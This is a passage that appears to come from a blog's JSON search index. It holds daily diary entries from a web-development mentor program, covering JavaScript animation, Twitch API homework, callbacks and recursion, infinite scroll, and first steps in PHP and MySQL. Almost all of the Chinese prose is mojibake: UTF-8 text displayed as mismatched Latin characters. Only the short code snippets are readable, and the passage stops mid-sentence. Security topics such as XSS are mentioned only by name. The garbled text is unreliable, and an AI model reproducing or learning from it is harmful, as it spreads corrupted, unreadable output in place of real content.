è¦å­¸æœƒæ€å¾ä¸€å¤§å †ç¨‹å¼ç¢¼ä¸­æŠ“å‡ºé‡é»ã€‚ é€™ä¸€é»æ˜¯æˆ‘è¦ºå¾—è‡ªå·±å­¸åˆ°æœ€é‡è¦çš„äº‹æƒ…ã€‚ ä»Šå¤©ä¹Ÿå­¸åˆ°æ€éº¼ç”¨åŸç”Ÿ JavaScript ä¾†å¯«å¹»ç‡ˆç‰‡çš„å‹•ç•«ï¼Œä»¥å‰æˆ‘éƒ½åªæœƒç”¨ jQuery å¯«å¥½çš„ functionï¼ˆ.animateï¼‰ ä¾†åšï¼Œä½†ä»Šå¤©åšå®Œæ‰ç™¼ç¾ã€Œç–‘ï¼Ÿå…¶å¯¦æ²’é‚£éº¼è¤‡é›œå•Šã€ï¼Œä¸€å€‹è »æœ‰æ„æ€çš„å°æ’æ›²ã€‚ å¦å¤–ä¹Ÿå¾ˆé–‹å¿ƒç¬¬ä¸€æ¬¡å¯«å‡ºäº†ã€Œæ¨¡çµ„ã€ï¼Œé›–ç„¶çµ•å°æ¯”ä¸ä¸Šç¶²è·¯ä¸Šå„ç¨®æœ‰åçš„ Carousel å¥—ä»¶ï¼Œä½†èƒ½è‡ªå·±åšå‡ºæ±è¥¿ä¾†çš„æ„Ÿè¦ºå¾ˆæ£’ï¼Œå¾ˆé–‹å¿ƒã€‚ é¡Œå¤–è©±å¸Œæœ›é€™ä¸–ä¸Šæ„›ç§€å„ªè¶Šçš„äººå°‘ä¸€äº›ï¼Œä¸å–œæ­¡é‚£äº›è‡ªå·±ç”¢ç”Ÿå„ªè¶Šæ„Ÿå°±å»æ”»æ“Šåˆ¥äººçš„äººï¼Œå·®å‹ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ week7 æª¢è¨å®Œå¾Œï¼Œé–‹å§‹ week8 çš„é€²åº¦ã€‚","link":"/2022/01/24/mentor-program-day42/"},{"title":"mentor-program-day43","text":"æ–°çš„ä¸€é€±åˆé–‹å§‹äº†ã€‚ é€²åº¦ä»Šå¤©æŠŠæ˜¨å¤©å¯«çš„å°ç©å…·å¯«æˆä¸€å€‹æ­£å¼çš„ å¥—ä»¶ã€‚ å¦å¤–ä¹Ÿæ·±å…¥ç ”ç©¶äº†ä¸€ä¸‹åˆ©ç”¨ DOM æ”¹è®Š transition è£½é€ ç°¡å–®çš„å‹•ç•«æ•ˆæœï¼Œä¹Ÿé †æ‰‹ä»¿è£½äº†ä¸€ä¸‹ jQuery çš„æ–¹æ³•ï¼Œé‚„è »æœ‰è¶£çš„ï¼š DOM ä¹‹åœ¨å‹•ç•«çµæŸå¾ŒåšæŸä»¶äº‹ æœ€å¾Œä¹ŸæŠŠ week7 çš„ä½œæ¥­è‡ªæˆ‘æª¢è¨ï¼ŒæŠŠå­¸åˆ°çš„æ–°æ±è¥¿çµ¦è¨˜ä¸‹ä¾†ï¼š å–„ç”¨è·³è„«å­—å…ƒï¼Œé¿å…ä¸åˆæ³•çš„è¼¸å…¥å…§å®¹ DOM ä¸€äº›é‚Šç·£ä½†è »å¥½ç”¨çš„ API å­¸åˆ°çš„äº‹æƒ…å¾æ˜¨å¤©æå¥—ä»¶åˆ°ä»Šå¤©ä»¿è£½ jQuery çš„ animateï¼Œæ„Ÿè¦ºè‡ªå·±è¶Šä¾†è¶Šç†Ÿæ‚‰ function è·Ÿ callback é€™å…©å€‹æ±è¥¿ï¼Œé‚„æœ‰ä¸€ç›´æƒ³ç†è§£çš„ã€Œæ¨¡çµ„ã€è§€å¿µã€‚é›–ç„¶ç¾åœ¨åªæ˜¯ç¬¬ä¸€æ­¥ï¼Œä½†é€™ä¸€æ­¥å»æ ¼å¤–åœ°æœ‰æ„ç¾©ã€‚ä¹Ÿè¨±æ˜¯å› ç‚ºä»¥å‰çš„æˆ‘åšä¸åˆ°é€™äº›äº‹æƒ…å§ã€‚å¸Œæœ›æ¥ä¸‹ä¾†é‚„èƒ½è®Šå¾—è¶Šä¾†è¶Šå¼·ã€‚ å¦å¤–åœ¨çœ‹ [FE102] æ™‚æåˆ°äº†ã€ŒåŒæºç­–ç•¥ã€ï¼Œè®“æˆ‘å¥½å¥‡ã€Œç‚ºä»€éº¼åªæœ‰ç€è¦½å™¨æœ‰é€™å€‹é™åˆ¶ï¼Ÿã€ æ‰€ä»¥æˆ‘ä¸Šç¶²åšäº†ä¸€é»ç ”ç©¶ï¼Œç†è§£äº†åŸå› ï¼Œé‚„é †é“æŠŠä»¥å‰æ›¸ä¸Šçœ‹éƒ½æ²’çœ‹æ‡‚çš„ã€ŒXSS æ”»æ“Šã€çµ¦å¼„æ‡‚äº†ã€‚ä¸å¾—ä¸ä½©æœæƒ³å‡ºé€™äº›æ”»æ“Šæ–¹å¼çš„äººï¼Œå°±è·Ÿæƒ³å‡ºã€ŒJSONPã€ä¾†ç¹éåŒæºç­–ç•¥çš„äººä¸€æ¨£ï¼ŒçœŸçš„æ˜¯å¤ªæ©Ÿæ™ºäº†ã€‚ é¡Œå¤–è©±å¯æƒ¡ï¼ä»Šå¤©éŒ¯éæ­£ç‰ˆæåš´äº†å•¦( Âºï¹ƒÂº ) æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠç­†è¨˜åšå®Œå¾Œé–‹å§‹åš week8 çš„ä½œæ¥­ã€‚","link":"/2022/01/24/mentor-program-day43/"},{"title":"mentor-program-day44","text":"æ™‚é–“ä¸€å¤©ä¸€å¤©çš„èµ°ï¼ŒPeaNu ä¸€å¤©ä¸€å¤©çš„æˆé•·ã€‚ é€²åº¦ä»Šå¤©åšäº† week8 çš„ç¬¬ä¸€å€‹ä½œæ¥­ï¼š ä¹Ÿé †ä¾¿åšäº†æŒ‘æˆ°é¡Œï¼š å­¸åˆ°çš„äº‹æƒ…åœ¨ hw1 ä¸­æˆ‘å­¸åˆ°æ€éº¼å»æŠŠ code çµ¦å„ªåŒ–ã€‚ å…¶å¯¦å¤§éƒ¨åˆ†åœ¨è§£é¡Œçš„æ™‚å€™éƒ½æ˜¯ç”¨ã€Œå…ˆæ±‚æœ‰ï¼Œå†æ±‚å¥½ã€çš„å¿ƒæ…‹ä¾†å¯« codeï¼Œæ‰€ä»¥ä¸€é–‹å§‹çš„ code çœŸçš„æ˜¯å…¶äº‚ç„¡æ¯”ã€‚ä½†åœ¨æŠŠ code å„ªåŒ–çš„éç¨‹æˆ‘è¦ºå¾—æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œå› ç‚ºä¸€é–‹å§‹åœ¨è§£é¡Œæ™‚ä¸æœƒæƒ³åˆ°ã€Œè¯¶ï¼Ÿé€™è£¡å…¶å¯¦èƒ½åŒ…æˆä¸€å€‹ functionã€çš„æƒ³æ³•ã€‚æ¯”è¼ƒå¤šéƒ½æ˜¯å…ˆå¯«äº†ä¸€é•·ä¸²ï¼Œå†ä¾†ç²¾ç°¡åŒ–ï¼Œå¥—åˆ° CSS ä¸Šä¹Ÿæœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ã€‚ å¾é€²éšæŒ‘æˆ°æä¸­æˆ‘å°æ–¼ã€ŒåŒæ­¥ / éåŒæ­¥ã€æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚å¸Œæœ›ä¹‹å¾Œèƒ½èæœƒè²«é€šã€‚ é¡Œå¤–è©±æ¯å¤©çš„å¤œæ™šéƒ½å¥½æ¼«é•·ï½ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ week8 çš„ä½œæ¥­åšå®Œã€‚","link":"/2022/01/25/mentor-program-day44/"},{"title":"mentor-program-day45","text":"ä»Šå¤©çµ¦è‡ªå·±æ‰“å¹¾åˆ†ï¼Ÿ é€²åº¦ä»Šå¤©åšäº† week8 çš„ç¬¬äºŒå€‹ä½œæ¥­ï¼š å¥½ä¹…ä¸è¦‹çš„ Twitchï¼Œé›–ç„¶é‚„æ²’å®Œå…¨åšå®Œï¼Œä½†å¸Œæœ›æ˜å¤©èƒ½æŠŠå®ƒåšçš„è¶Šä¾†è¶Šå¥½ã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨ä¸² API çš„æ™‚å€™æœ‰å€‹è »ç‰¹åˆ¥çš„éƒ¨åˆ†æ˜¯ã€Œåœ–ç‰‡ç¶²å€ã€è¦è‡ªå·±è¨­å®šå¯¬é«˜åº¦ï¼Œæ‰€ä»¥è³‡æ–™æ ¼å¼æ˜¯é•·é€™æ¨£ï¼š https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-{width}x{height}.jpg é€™æ™‚å€™ä»¥å‰å­¸çš„ã€Œæ­£å‰‡è¡¨é”å¼ã€å°±æ´¾ä¸Šç”¨å ´äº†ï¼š 1234// åŒ¹é… {aåˆ°zå¤§å°å¯«}x{aåˆ°zå¤§å°å¯«}const regExp = /\\{[a-zA-Z]+\\}x\\{[a-zA-Z]+\\}/const url = \"https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-{width}x{height}.jpg\"url.replace(regExp, '600x360') å°±å¯ä»¥æ‹¿åˆ°æŒ‡å®šçš„åœ–ç‰‡å°ºå¯¸ï¼š https://static-cdn.jtvnw.net/previews-ttv/live_user_lck_korea-600x360.jpg ä»¥å‰èŠ±æ™‚é–“å­¸çš„æ±è¥¿èƒ½æ´¾ä¸Šç”¨å ´ï¼Œå°±è®“äººæ„Ÿè¦ºç‰¹åˆ¥é–‹å¿ƒã€‚ å¦å¤–ä¸² API ä¸å¤–ä¹å°±æ˜¯è¦åšå„ç¨®ã€ŒéåŒæ­¥ã€è™•ç†ã€‚å„˜ç®¡ç¾åœ¨æœ‰å¥½ç”¨çš„ Promise å¯ä»¥é¿å…ã€Œcallback hellã€ï¼Œä½†é‚„æ˜¯æƒ³åŠ å¼·è‡ªå·±å°æ–¼ã€Œcallbackã€çš„æ¦‚å¿µã€‚æ‰€ä»¥åœ¨å¯« hw2 çš„æ™‚å€™éƒ½é‚„æ˜¯ç”¨å‚³çµ±çš„ xhr è€æ–¹æ³•ä¾†åšï¼Œå¸Œæœ›è‡ªå·±æœ‰å¤©èƒ½æˆç‚º callback å¤§å¸«ï¼ æˆ‘è¦ºå¾—éåŒæ­¥æœ€éº»ç…©çš„åœ°æ–¹åœ¨æ–¼ã€Œè¿´åœˆã€å§ï¼Ÿå› ç‚ºé€™æ¨£å­å¯«çµ•å°æ˜¯éŒ¯çš„ï¼š 12345for(let i=1; i&lt;=10; i++) { setTimeout(function() { console.log(i) }, 1000)} é€™æ¨£å¯«çµ•å°ä¸æ˜¯ã€Œæ¯ä¸€ç§’å°å‡º 1, 2, 3, ..., 10ã€ï¼Œè€Œæ˜¯ 1 ç§’å¾Œç›´æ¥å°å‡º 1 ~ 10ã€‚ æ‰€ä»¥å°±ä¸èƒ½ç”¨è¿´åœˆä¾†å¯«ï¼Œè€Œæ˜¯å¾—ç”¨ã€Œéè¿´ã€çš„æ–¹å¼ä¾†åšï¼ˆå…ˆä¸ç®¡ Promise é€™å€‹å¥½ç”¨çš„æ±è¥¿ï¼‰ï¼š 12345678910111213let total = 10let start = 1function loop(i) { if (i &gt; total) { return undefined } setTimeout(function() { console.log(i) // ä¸€ç§’éå¾Œå† call ä¸€æ¬¡ loop loop(++i) }, 1000) }loop(start) æ‰€ä»¥æ›æˆç™¼ request çš„è©±å¯èƒ½å°±è¦è®Šæˆé€™æ¨£ï¼š 12345678910111213141516171819// ç¸½å…±è¦ç™¼å¹¾æ¬¡ requestlet total = 10// ä»£è¡¨ç™¼äº†å¹¾æ¬¡ requestlet counter = 1function callback(data) { // æ‹¿åˆ°è³‡æ–™å°±æ›´æ–°ä¸€æ¬¡æ¬¡æ•¸ counter += 1 /* ... ... ... */ // ç™¼å¤ äº†å°±è·³å‡ºå» if (counter &gt; total) { return undefined } // ä¸å¤ çš„è©±ç¹¼çºŒ call API getData(url, callback)} å¥½åœ¨ä¸€ç›´éƒ½æœ‰ç·´ç¿’éè¿´çš„æ¦‚å¿µï¼Œä¸ç„¶å¤§æ¦‚æœƒåœ¨é€™è£¡æ­»å¾ˆæ…˜ âˆ‘(âœ˜Ğ”âœ˜à¹‘ ) é¡Œå¤–è©±å¸Œæœ›æ˜å¤©èƒ½è²·åˆ°å¥½åƒçš„èƒ¡æ¤’é¤…ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©æŠŠ week8 çš„ä½œæ¥­åšå®Œã€‚","link":"/2022/01/26/mentor-program-day45/"},{"title":"mentor-program-day46","text":"æ—¥å¾©ä¸€æ—¥ã€‚ é€²åº¦æŠŠæ˜¨å¤©çš„ hw2 æ²’åšå®Œçš„éƒ¨åˆ†è£œå®Œï¼Œä¹Ÿæ–°å¢äº†æŒ‘æˆ°é¡Œçš„ã€Œé¡¯ç¤ºæ›´å¤šã€åŠŸèƒ½ï¼š çœ‹äº†èˆŠç‰ˆçš„ Twitch API æ‰å¯Ÿè¦ºæ–°ç‰ˆå¯¦åœ¨æ˜¯ä¸å‹å–„ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼æœƒ deprecatedï¼ˆæ£„ç”¨ï¼‰ å‘¢ï¼Ÿ ( Â´â€¢Ì¥Ã—â€¢Ì¥` ) å­¸åˆ°çš„äº‹æƒ…æˆ‘é‚„æ˜¯è¦ºå¾—ã€ŒéåŒæ­¥ã€æ˜¯å€‹æœƒè®“è…¦è¢‹æ‰“çµçš„è§€å¿µï¼Œå°¤å…¶æ˜¯è¦ã€Œéè¿´ã€çš„æ–¹å¼ä¾†é‡è¤‡åŸ·è¡Œã€‚ å¦å¤–æ˜¨å¤©ç‚ºäº†æå‡ºã€Œå¯¦æ³ä¸»é ­åƒã€æäº†åŠå¤©ï¼Œæ˜æ˜ç”¨ GET å¸¶ä¸Šçš„ user_id æ˜¯ 1, 2, 3 é€™æ¨£çš„é †åºï¼Œåå›ä¾†çš„è³‡æ–™ç¢ºæœ‰å¯èƒ½æ˜¯ 3, 2, 1 æˆ– 2 1 3 å„ç¨®éš¨æ©Ÿå¯èƒ½ï¼ŒçœŸçš„æ˜¯æ»¿é ­å•è™Ÿï¼Ÿï¼Ÿï¼Ÿ æˆ‘æœ‰æƒ³éæ—¢ç„¶å›å‚³è³‡æ–™ä¸æœƒæŒ‰ç…§è«‹æ±‚æ’åºï¼Œé‚£æ˜¯ä¸æ˜¯åªå¥½ã€Œä¸€å€‹ä¸€å€‹ç™¼è«‹æ±‚ã€ï¼Œä¾‹å¦‚èªªæˆ‘è¦ 20 å€‹ user è³‡æ–™ï¼Œæˆ‘å°±ä¾ç…§é †åºç™¼ 20 æ¬¡ã€Œå–å¾—å–®å€‹ userã€çš„è³‡æ–™æ˜¯ä¸æ˜¯ä¹Ÿè¡Œï¼Ÿä¸éé€™æ¨£çš„æ•ˆç‡å¯¦åœ¨æœ‰å¤ å·®ï¼Œæˆ‘æ¸¬è©¦çš„çµæœæ˜¯å¾åŸæœ¬çš„ã€Œ1 ~ 2ç§’ã€è®Šæˆã€Œ10 ~ 11 ç§’ã€ã€‚ æˆ‘é ï¼Œé€™ä½¿ç”¨è€…é«”é©—ä¹Ÿå¤ªç³Ÿäº†å§ï¼æˆ‘è¦ºå¾—ä¸è¡Œï¼Œé˜¿å¶½ä¹Ÿè¦ºå¾—ä¸è¡Œã€‚ æ‰€ä»¥æ˜å¤©æ‰“ç®—å·æ‹¿ example è£¡çš„ client_id ä¾†é‡æ–°ä¸²ä¸€æ¬¡èˆŠç‰ˆçš„ Twitch APiï¼Œå¸Œæœ›å¯ä»¥è®“é€™ä½œæ¥­ç•«ä¸‹å®Œç¾çš„å¥é»ã€‚ï¼ˆæˆ‘æœ‰è©¦è‘—è‡ªå·±é‡ç“£ä¸€å€‹ client_idï¼Œä½†ç„¡å¥ˆçš„æ˜¯æ–°è¾¨çš„ client_id ä¸å¯ä»¥ä¸²èˆŠç‰ˆçš„ APIï¼Œæ‰€ä»¥è«‹åŸè«’çª© QQï¼‰ é¡Œå¤–è©±çƒéª¨é›å¥½åƒè€¶ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©çœŸçš„èƒ½æŠŠ Twitch çš„ä½œæ¥­çµ¦åšå®Œï¼Œç„¶å¾Œæª¢è¨ä¸€ä¸‹ä½œæ¥­ï½","link":"/2022/01/27/mentor-program-day46/"},{"title":"mentor-program-day47","text":"ç²¾ç–²åŠ›ç«­ã€‚ é€²åº¦ç”¨èˆŠç‰ˆçš„ Twitch API é‡æ–°ä¸²äº†ä¸€æ¬¡ï¼Œæœ€å¾Œä¹ŸåŠ äº†ã€Œç„¡é™æ»¾å‹•ã€çš„åŠŸèƒ½ï¼š ç‚ºäº†åŠ ç„¡é™æ»¾è»¸çš„åŠŸèƒ½çœŸæ˜¯å»¢äº†ä¸å°‘å¿ƒåŠ›â€¦ å­¸åˆ°çš„äº‹æƒ…èˆŠç‰ˆçš„ API åœ¨è³‡æ–™çš„ä¸²æ¥ä¸Šæ¯”æ–°ç‰ˆè¼•é¬†ä¸å°‘ï¼Œè©²æœ‰çš„æ±è¥¿éƒ½é™„åœ¨è£¡é¢ï¼Œä¸åƒæ–°ç‰ˆé‚„è¦æ‰“å¾ˆå¤šçš„ API å»æ‹¿ä¸åŒçš„è³‡æ–™ã€‚ é€™æ¬¡é‡åšçš„éƒ¨åˆ†ä¸€å¾‹æ”¹ç”¨ Promise ä¾†è™•ç†ï¼Œä¸å¾—ä¸èªªæ•´é«”çš„çµæ§‹æ¯” callback é‚„è¦å¥½æ‡‚å¤šäº†ï¼Œè¦ä¿®æ”¹æ±è¥¿æ™‚ä¹Ÿä¸æœƒäº‚ä¸ƒå…«ç³Ÿçš„ï¼Œç”¨ä¸€å¥è©±ä¾†èªªå°±æ˜¯ï¼š èˆ’æœã€‚ æ„Ÿè¦ºåƒæ˜¯å…©ç¨®ä¸åŒçš„ä¸–ç•Œä¸€æ¨£ï¼Œæ€ªä¸å¾—ç¾åœ¨æ»¿è¡—çš„ Promiseâ€¦ å¦å¤–å°±æ˜¯ã€Œç„¡é™æ»¾å‹•ï¼ˆInfinite Scrollï¼‰ã€çš„éƒ¨åˆ†ï¼Œæœ¬ä¾†æ˜¯æ²’æœ‰æ‰“ç®—åšé€™éƒ¨åˆ†çš„ï¼Œä¸éæ—¢ç„¶å¥³æœ‹å‹éƒ½æ•²ç¢—äº†ï¼Œé‚£æˆ‘å°±åŠ æ²¹é»å§( ÂºÏ‰Âº ) ä¸éä¹Ÿè—‰æ­¤å­¸åˆ°äº†ä¸€å€‹é‚„ä¸éŒ¯ç”¨çš„ APIï¼šIntersectionObserverï¼Œæ¯”èµ·å‚³çµ±ä¸Šçš„ç›£è½ scroll ä½œæ³•ï¼Œé€™å€‹ç¢ºå¯¦æ¯”è¼ƒç›´è¦ºï¼Œä¹Ÿèƒ½é¿å…æœ€å¤§çš„å•é¡Œã€Œé‡è¤‡è§¸ç™¼ã€ã€‚é›–ç„¶é‚„æ˜¯æœ‰ä¸€äº›é›£å…çš„ bugï¼ˆæœ‰å¯èƒ½æ˜¯æˆ‘é‚è¼¯æ²’å¯«å¥½ï¼‰ï¼Œåƒæ˜¯èª¤è§¸æˆ–å¶çˆ¾çš„é‡è¤‡è§¸ç™¼å•é¡Œï¼Œé€™éƒ¨åˆ†æˆ‘ç›¡åŠ›ç”¨ flag ä¾†æ§åˆ¶ï¼Œç›®å‰æ¸¬è©¦èµ·ä¾†æ˜¯æœ‰æ”¹å–„ä¸€é»ï¼Œä¸éå¯¦éš›ç©©ä¸ç©©å®šé‚„æ˜¯è¦ç­‰ä¹‹å¾Œæœ‰æ™‚é–“å†æ¸¬è©¦çœ‹çœ‹äº†ã€‚ é¡Œå¤–è©±ä¸‹ä¸€æ•´å¤©çš„é›¨ï¼ŒçœŸæ˜¯è¨å­ï½ æœŸè¨±ä¹Ÿè¨±æ˜å¤©æª¢è¨å®Œå°±èƒ½é–‹å§‹é€²åˆ° week9 çš„é€²åº¦äº†ï¼Œç‰¹åˆ¥æ–°å¥‡çš„å¾Œç«¯ä¸–ç•Œï½","link":"/2022/01/28/mentor-program-day47/"},{"title":"mentor-program-day48","text":"ç­†è¨˜çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æŠŠä¸€äº› week8 å­¸åˆ°çš„éƒ¨åˆ†åšäº†ç­†è¨˜ï¼Œä¹Ÿåšå®Œäº†è‡ªæˆ‘æª¢è¨ï¼š DOM æ¸…é™¤æ‰€æœ‰çš„å­å…ƒç´  CSS å¥½ç”¨çš„ filter å±¬æ€§ ç”¨ JavaScript æ”¹è®Š CSS çš„è®Šæ•¸ åˆ©ç”¨ IntersectionObserver ä¾†è£½ä½œç„¡é™æ»¾å‹• ä»€éº¼æ˜¯ AJAXï¼Ÿ ä»€éº¼æ˜¯ JSONP æ˜å¤©å°±æœƒæ­£å¼é€²å…¥ week9 çš„é€²åº¦äº†ï¼ŒæŠ±è‘—ä¸€é»æ—¢æœŸå¾…åˆå®³æ€•å—å‚·å®³çš„å¿ƒæƒ…ï¼ˆçœŸçš„è¦ä¾†å­¸å¾Œç«¯äº†é˜¿ï½ï¼‰ã€‚ ç¸½è€Œè¨€ä¹‹å…ˆç¥è‡ªå·±ä¸€åˆ‡é †åˆ© Î¾( âœ¿ï¼â—¡â›) å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å¤§å¤šæ˜¯è¤‡ç¿’æ¯”è¼ƒå¤šï¼Œç¾åœ¨çš„æˆ‘æ‡‰è©²èƒ½æœ‰è‡ªä¿¡çš„èªªï¼š æˆ‘çŸ¥é“ AJAX æ˜¯ä»€éº¼ï¼Œä¹ŸæœƒçŸ¥é“æ€éº¼ä¸² APIã€‚ é€™é€±çš„æ ¸å¿ƒçŸ¥è­˜ä¹Ÿæ˜¯ä»¥é€™äº›ç‚ºä¸»ã€‚ä¸éæˆ‘é‚„æ˜¯è¦ºå¾—è‡ªå·±ä¸æ˜¯ callback å¤§å¸«ï¼Œç•¶æ³¢å‹•æ‹³å‡ºç¾æ™‚å°±å¥½åƒã€Œæ‰“ä¸å€’çš„ç©ºæ°£äººã€ä¸€æ¨£ï¼Œå„˜ç®¡åšå¥½çš„æº–å‚™é‚„æ˜¯æœƒè¢«è™ä¸€æ³¢ã€‚ï¼ˆRRRRRR ä½†æ²’é—œä¿‚ï¼Œæˆ‘ç›¸ä¿¡ç¸½æœ‰ä¸€å¤©èƒ½æˆ°å‹å®ƒçš„ã€‚ é¡Œå¤–è©±å…¶å¯¦åœ¨å­¸ç¿’äº†é€™éº¼ä¹…çš„å‰ç«¯å¾Œï¼Œæœ‰äº›æƒ³æ³•æ…¢æ…¢çš„æ”¹è®Šäº†ã€‚ä»¥å‰çš„æˆ‘ç¸½è¦ºå¾—å‰ç«¯åˆ°åº•ç‚ºä»€éº¼è¦å­¸ CSSï¼Ÿæˆ‘æ˜æ˜æ˜¯å·¥ç¨‹å¸«ç‚ºä»€éº¼è¦å­¸æ€éº¼åˆ»ä»‹é¢ï¼Ÿç•¶æˆ‘å·¥å…·äººï¼Ÿæ¨£æ¨£éƒ½è¦æœƒï¼Ÿï¼Ÿï¼Ÿ ä½†ç¾åœ¨çªç„¶æœƒæœ‰é»è¦ºå¾—å…¶å¯¦æŒºæ…¶å¹¸èƒ½å­¸ CSSï¼Œå› ç‚ºï¼š å“‡ï¼Œä½ é™¤äº†å¯«ç¨‹å¼ä»¥å¤–é‚„èƒ½è‡ªå·±åšä»‹é¢å“¦ï¼Œä¹Ÿå¤ªå±Œäº†å§ï¼Ÿ ä¸æ˜¯æœ‰äººè·Ÿæˆ‘é€™æ¨£èªªéï¼Œç´”ç²¹æ˜¯æˆ‘è‡ªå·±è…¦è£œçš„ã€‚ è©²æ€éº¼èªªï¼Œé›–ç„¶å¤§å®¶éƒ½èªªå‰ç«¯çš„é–€æª»ç›¸å°ç°¡å–®ï¼Œä½†æˆ‘è‡ªèªå‰ç«¯å·¥ç¨‹å¸«æœ‰å€‹å…¶ä»–å·¥ç¨‹å¸«ä¸ä¸€å®šæœƒæœ‰çš„æ±è¥¿ï¼šè‡ªå·±æä¸€å€‹ UI ä»‹é¢ ä½†ä¹Ÿä¸æ˜¯èªªé€™æ¨£æ¯”è¼ƒå²å®³æ‰€ä»¥å„ªè¶Šä»€éº¼çš„ï¼Œåªæ˜¯æƒ³å‘Šè¨´è‡ªå·±å…¶å¯¦å­¸äº†é€™äº›æŠ€è¡“éƒ½æ˜¯æœ‰æ„ç¾©çš„ã€‚é›–ç„¶æœ‰æ™‚å€™å­¸èµ·ä¾†çœŸçš„è »ç…©çš„ï¼Œä½†æœ€å¾Œç•¶ä½ æŒæ¡äº†é€™äº›å·¥å…·ä¹‹å¾Œï¼Œå…¶å¯¦é€™ä¸€åˆ‡éƒ½é‚„è »å€¼å¾—çš„ã€‚ æœŸè¨±æ˜å¤©å°±è¦é€²å…¥ week9 äº†ï¼Œå†æ¬¡ç¥ç¦è‡ªå·±ä¸€åˆ‡é †åˆ©ï½","link":"/2022/01/29/mentor-program-day48/"},{"title":"mentor-program-day49","text":"åˆæ¬¡è¦‹é¢çš„å¾Œç«¯ã€‚ é€²åº¦ç¸½ç®—é€²åˆ°å¾Œç«¯çš„éƒ¨åˆ†äº†ï¼Œé›–ç„¶æ‰å‰›é–‹å§‹ä½†ä¹Ÿåšäº†é»ç­†è¨˜ï¼š Apatch èˆ‡ PHP çš„é‹ä½œåŸç† PHP åŸºç¤ ç‚ºä»€éº¼è¦ç”¨è³‡æ–™åº«ï¼Ÿ é—œè¯å¼èˆ‡éé—œè¯å¼è³‡æ–™åº« ä»€éº¼æ˜¯ Schemaï¼ˆçµæ§‹ï¼‰ å­¸åˆ°çš„äº‹æƒ…åœ¨å‰ç«¯æ··äº†é€™éº¼ä¹…ä»¥å¾Œï¼Œçµ‚æ–¼ä¾†åˆ°äº†å¾Œç«¯ã€‚ä»Šå¤©å¤§è‡´èªè­˜äº†å¾Œç«¯çš„ç”Ÿæ…‹é«”ç³»ï¼Œç¬¬ä¸€æ¬¡å¯« PHP çš„æ„Ÿè¦ºä¹Ÿå¾ˆç‰¹åˆ¥ï¼ŒåŸä¾†æ›å€‹ç¨‹å¼èªè¨€ä¾†å¯«ç¨‹å¼æ˜¯é€™ç¨®æ„Ÿè¦ºã€‚ ä¸éæ‹¿ä»¥å‰å¯«éçš„ C èªè¨€ä¾†è·Ÿ PHP ä¾†æ¯”çš„è©±æœƒè¦ºå¾— PHP é‚„ç®—å‹å–„ï¼Œåœ¨ C èªè¨€è£¡è¦è¼¸å‡ºè·Ÿè¼¸å…¥å°±è¦å…ˆæå€‹ &lt;stdid.h&gt; æ¨™é ­æª”ï¼Œè¦è¼¸å‡ºå…§å®¹å°±è¦ç”¨æ ¼å¼åŒ–è¼¸å‡º printf() æ­é… %s å’Œ %d ç­‰ç­‰çš„æ±è¥¿ï¼Œç¬¬ä¸€æ¬¡æ¥è§¸çš„æ™‚å€™çœŸçš„æœƒæƒ³èªªï¼š æˆ‘åˆ°åº•çœ‹äº†ä¸‰å°ï¼Ÿ ä¸éæˆ‘è¨˜å¾— PHP è£¡é¢ä¹Ÿæœ‰æä¾› printf() é€™å€‹ functionï¼Œæ‡‰è©²èªªä¸åªæ˜¯ PHPï¼Œåªè¦æ˜¯ç¨‹å¼èªè¨€éƒ½æœ‰æ©Ÿæœƒçœ‹åˆ°ã€Œæ ¼å¼åŒ–è¼¸å‡ºã€çš„ functionã€‚ ç¸½ä¹‹æˆ‘è¦ºå¾—é€™æ˜¯è »æœ‰è¶£çš„äº‹æƒ…ï¼Œä¸ç®¡æ˜¯å“ªå€‹ç¨‹å¼èªè¨€å®ƒå€‘éƒ½æœ‰ç›¸åŒçš„å½±å­ã€‚ é¡Œå¤–è©±é¬¼æ»…å¿«å®Œçµäº†é˜¿ï¼Œè¨˜å¾—æ²¹é‹ç¯‡å‰›æ’­æ™‚æˆ‘æ‰å‰›åŸ·è¡Œé€™ä»½è¨ˆç•«ã€‚ç¾åœ¨å·²ç¶“è¦å®Œçµäº†ï¼Œæ™‚é–“æœç„¶éå¾—å¾ˆå¿«ã€‚ æœŸè¨±æ˜å¤©è¦ç¹¼çºŒåŠ æ²¹ï¼Œå¸Œæœ›æŠŠè³‡æ–™åº«çš„æ“ä½œçµ¦å¼„ç†Ÿï½","link":"/2022/01/31/mentor-program-day49/"},{"title":"mentor-program-day50","text":"æ–°å¹´å¿«æ¨‚ã€‚ é€²åº¦é–‹å§‹çœ‹ [BE101] çš„èª²ç¨‹ï¼Œä»Šå¤©ä¸»è¦å­¸è·Ÿè³‡æ–™åº«ç›¸é—œçš„æ±è¥¿ï¼š MySQL èªæ³• PHP ä¸­å¸¸ç”¨çš„å…§å»ºå‡½å¼ å¾ PHP èªè­˜å‰ç«¯èˆ‡å¾Œç«¯çš„æºé€š å­¸åˆ°çš„äº‹æƒ…ä¹‹å‰å…¶å¯¦å°±æœ‰ç¨å¾®ç©éè³‡æ–™åº«ï¼Œä¸éæ˜¯ NoSQL çš„è³‡æ–™åº«ï¼šMongoDBã€‚ ä»¥å‰æœ‰æƒ³éè¦å­¸ MySQL é€™å€‹è³‡æ–™åº«ï¼Œä½†æ˜¯ç¶²è·¯ä¸Šçš„ç’°å¢ƒå»ºç½®æ•™å­¸å¯¦åœ¨æ˜¯å¤ªè©³ç´°ï¼ˆè¤‡é›œï¼‰ï¼Œæ‰€ä»¥æœ€å¾Œå°±æ”¾æ£„äº†ã€‚XAMPP æ˜¯å€‹å¾ˆå‹å–„çš„å®‰è£åŒ…ï¼Œåœ¨é€™è£¡æ„Ÿè¬ä¸€ä¸‹ç™¼æ˜é€™å€‹æ±è¥¿çš„äººã€‚ ä¸é MySQL 